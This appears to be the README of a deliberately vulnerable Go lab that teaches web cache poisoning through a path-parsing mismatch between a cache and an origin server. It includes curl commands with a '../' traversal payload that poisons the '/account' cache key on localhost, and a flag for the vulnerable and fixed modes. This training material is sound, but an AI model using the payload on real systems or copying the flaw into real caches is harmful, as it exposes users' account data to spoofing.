# Cache Poisoning via URL-Parser Discrepancy ("Cache What/Where")

This challenge demonstrates a cache-vs-origin path-parsing mismatch: the shared cache normalizes `../` traversal segments before computing its cache key, while the origin routes requests on the raw, un-normalized path (matching the `/static/` prefix first). An attacker can request a path that the origin serves as static content but that the cache normalizes down to a completely different, high-value key such as `/account` — storing attacker-influenced content under it for every subsequent caller.

## How to run it

```bash
go run main.go serve
```

## Endpoints

- `GET /static/<anything>` — served by the origin as static-bundle content
- `GET /account` — returns sensitive account data (balance, CSRF token)

## Exploiting it

```bash
# the cache normalizes this to "/account" and stores the static response under that key
curl --path-as-is "http://localhost:8080/static/main.js/../../account"

# any subsequent caller of "/account" now receives the poisoned, attacker-influenced response
curl "http://localhost:8080/account"
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: the cache key is computed from the normalized path, colliding with the origin's raw-path routing
go run main.go serve --vulnerable=true

# fixed: the cache key is computed from the raw, un-normalized path, matching how the origin actually routes it
go run main.go serve --vulnerable=false
```

## Disclaimer

This challenge is intentionally vulnerable. Do not deploy it on a publicly accessible server, as this could expose you to attacks.

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
